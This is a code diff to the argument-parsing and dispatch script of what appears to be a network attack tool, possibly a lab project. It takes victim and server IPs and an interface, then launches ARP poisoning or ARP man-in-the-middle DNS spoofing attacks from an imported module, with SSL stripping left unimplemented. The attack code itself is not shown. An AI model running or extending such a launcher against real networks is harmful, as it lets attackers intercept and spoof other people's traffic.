@@ -7,8 +7,9 @@ import attacks.all as attacks
 argumentParser = argparse.ArgumentParser()
 
 # Positional arguments
-argumentParser.add_argument('victim')
-argumentParser.add_argument('server')
+argumentParser.add_argument('victimIP')
+argumentParser.add_argument('serverIP')
+argumentParser.add_argument('interface')
 
 # Optional arguments
 argumentParser.add_argument('-a', '--arp', action = 'store_true') # ARP Poisoning Attack Flag
@@ -17,10 +18,12 @@ argumentParser.add_argument('-sa', '--sslarp', action = 'store_true') # SSL (ARP
 
 # Parse arguments
 parseArgs = argumentParser.parse_args()
-victim = parseArgs.victim 
+victimIP = parseArgs.victimIP 
+serverIP = parseArgs.serverIP
+interface = parseArgs.interface 
 isARPPoisoningAttack = parseArgs.arp
-isDNSARPStrippingAttack = parseArgs.dns
-isSSLARPStrippingAttack = parseArgs.ssl
+isDNSARPStrippingAttack = parseArgs.dnsarp
+isSSLARPStrippingAttack = parseArgs.sslarp
 
 # Check flags
 if (sum([isARPPoisoningAttack, isDNSARPStrippingAttack, isSSLARPStrippingAttack]) > 1):
@@ -29,10 +32,10 @@ if (sum([isARPPoisoningAttack, isDNSARPStrippingAttack, isSSLARPStrippingAttack]
 
 # Start right attack
 if isARPPoisoningAttack:
-    attack = attacks.ARPPoisoning(victim, '10.0.2.5')
+    attack = attacks.ARPPoisoning(victimIP, serverIP, interface)
     attack.execute()
 elif isDNSARPStrippingAttack:
-    attack = attacks.ARPMITMDNSSpoofing()
+    attack = attacks.ARPMITMDNSSpoofing(victimIP, interface)
     attack.execute()
 elif isSSLARPStrippingAttack:
     print('Implement SSL Stripping')
